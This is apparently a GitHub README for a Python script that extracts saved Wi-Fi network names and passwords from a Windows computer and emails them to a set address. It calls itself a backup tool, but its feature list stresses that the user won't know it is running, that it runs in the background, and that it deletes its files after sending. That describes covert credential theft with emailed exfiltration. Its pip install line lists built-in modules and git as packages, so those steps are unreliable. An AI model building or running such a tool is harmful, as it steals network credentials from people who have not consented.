# Wi-Fi SSID and Password Extractor

This Python script extracts Wi-Fi SSID (network name) and password information from a Windows machine and sends it via email as an attachment. It provides a convenient way to backup and retrieve Wi-Fi network details.

## Requirements
- Windows operating system
- Python 3.x installed
- Required Python packages: smtplib

## Installation

you can run it on windows distribution and for termux it will be available soon.

#### for windows
```bash
  pip install git python3 os subprocess tempfile smtplib
  git clone https://github.com/DarkImpact1/Saved_Wifi_ssid_pwd_Extractor.git
  python3 script.py
```
## Features
- It will extract the saved wi-fi password from your personal computer.
- Send email to recipient address.
- While execution user won't know what is happening .
- File will be created, password and ssid will be extracted and will be sent to provided email.
- once file sent files will be deleted.

## Usage
- Clone the repository or download the script file.
- Run the script using Python.
- The script will extract Wi-Fi information and create a confidential text document containing SSID and password details.
- The script will send an email with the confidential document as an attachment. You will need to provide the sender's email, password , and the recipient's email address within the script.
- After sending the email, the script will delete all extracted files and the confidential document.
- Every process will be running on the background and once executed you'll get mail 

### Note: 
- The script is specifically designed for Windows operating systems.
- Make sure to provide the correct sender's email, password, and recipient's email address in the script.
- Ensure that the smtplib package is installed before running the script.

### For generating password
- Go to the Google Account security settings page: https://myaccount.google.com/security.
- Under the "Signing in to Google" section, click on "2-Step Verification."
- Follow the prompts to set up 2FA if you haven't already done so.
- Once 2FA is enabled, go back to the security settings page and click on "App Passwords."
- Select the app as "Mail" and the device as "Other (Custom name)."
- Provide a custom name for the app password, such as "SMTP Email Sender," and click on the "Generate" button.
- Google will generate a unique app password for you. Make sure to copy it.
